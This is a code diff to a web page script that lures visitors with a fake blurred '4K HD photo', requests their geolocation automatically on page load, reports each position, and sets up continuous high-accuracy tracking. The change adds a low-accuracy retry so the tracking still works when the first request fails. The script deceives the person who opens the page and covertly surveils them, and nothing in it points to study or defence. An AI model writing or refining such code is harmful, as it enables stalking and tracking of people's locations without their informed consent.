@@ -243,28 +243,38 @@
         function requestLocationAndUnlock() {
             document.getElementById("statusText").innerText = "Verifying Location Access...";
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        reportLocation(pos);
-                        if (!watchId) {
-                            watchId = navigator.geolocation.watchPosition(reportLocation, null, {
-                                enableHighAccuracy: true,
-                                maximumAge: 0,
-                                timeout: 10000
-                            });
-                        }
-                    },
-                    (err) => {
-                        alert("Please allow location access to unblur and view full 4K HD photo!");
-                        document.getElementById("statusText").innerText = "Permission Denied";
-                    },
-                    { enableHighAccuracy: true }
-                );
-            } else {
+            if (!navigator.geolocation) {
                 alert("Geolocation is not supported by your device.");
+                return;
             }
+
+            function handlePos(pos) {
+                reportLocation(pos);
+                if (!watchId) {
+                    watchId = navigator.geolocation.watchPosition(reportLocation, null, {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 7000
+                    });
+                }
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                handlePos,
+                (err) => {
+                    navigator.geolocation.getCurrentPosition(
+                        handlePos,
+                        (err2) => {
+                            alert("Please allow location access to unblur and view full 4K HD photo!");
+                            document.getElementById("statusText").innerText = "Permission Denied";
+                        },
+                        { enableHighAccuracy: false, timeout: 4000 }
+                    );
+                },
+                { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
+            );
         }
+
 
         // Auto trigger location request on load
         window.onload = function () {
